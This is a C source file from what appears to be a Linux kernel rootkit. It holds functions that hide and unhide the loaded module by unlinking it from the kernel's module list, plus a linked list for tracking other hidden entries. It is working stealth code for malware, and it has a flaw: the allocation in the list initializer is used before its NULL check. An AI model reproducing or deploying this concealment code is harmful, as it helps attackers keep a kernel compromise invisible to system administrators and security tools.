#include <linux/module.h>
#include <linux/list.h>

#include "../include/debug.h"

#include "include/hide.h"

struct hidden_list *hidden_list_head = NULL;

int hide(void)
{
    RTK_DEBUG("Hiding the rootkit\n");

    if (hidden)
    {
        RTK_DEBUG("Rootkit already hidden.\n");
        return -1;
    }

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;

    RTK_DEBUG("Should have hidden the rootkit\n");

    return 0;
}

int unhide(void)
{
    RTK_DEBUG("Unhiding the rootkit\n");

    if (!hidden)
    {
        RTK_DEBUG("Rootkit already shown.\n");
        return -1;
    }

    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;

    RTK_DEBUG("Should have revealed the rootkit\n");

    return 0;
}

void init_hidden_list(void)
{
    hidden_list_head = kmalloc(sizeof(struct hidden_list), GFP_KERNEL);
    hidden_list_head->next = NULL;
    hidden_list_head->entry = NULL;

    if (!hidden_list_head)
    {
        RTK_DEBUG("Failed to allocate memory for hidden list\n");
    }

    RTK_DEBUG("Hidden list initialized at %p\n", hidden_list_head);
}

void cleanup_hidden_list(void)
{
    struct hidden_list *p_current = hidden_list_head;
    struct hidden_list *p_next;

    while (p_current)
    {
        p_next = p_current->next;
        kfree(p_current);
        p_current = p_next;
    }

    hidden_list_head = NULL;
}

int add_hidden_entry(void *entry)
{
    struct hidden_list *new_hidden_entry = kmalloc(sizeof(struct hidden_list), GFP_KERNEL);
    if (!new_hidden_entry)
    {
        RTK_DEBUG("Failed to allocate memory for hidden entry\n");
        return -1;
    }

    RTK_DEBUG("new_hidden_entry: %p\n", new_hidden_entry);

    char *entry_str = (char *)entry;

    RTK_DEBUG("Hiding %s\n", entry_str);

    new_hidden_entry->entry = entry;
    new_hidden_entry->next = hidden_list_head;
    hidden_list_head = new_hidden_entry;

    return 0;
}

int remove_hidden_entry(void *entry)
{
    struct hidden_list *p_current = hidden_list_head;
    struct hidden_list *prev = NULL;

    while (p_current)
    {
        if (p_current->entry == entry)
        {
            if (prev)
            {
                prev->next = p_current->next;
            }
            else
            {
                hidden_list_head = p_current->next;
            }

            kfree(p_current);
            return 0;
        }

        prev = p_current;
        p_current = p_current->next;
    }

    return -1;
}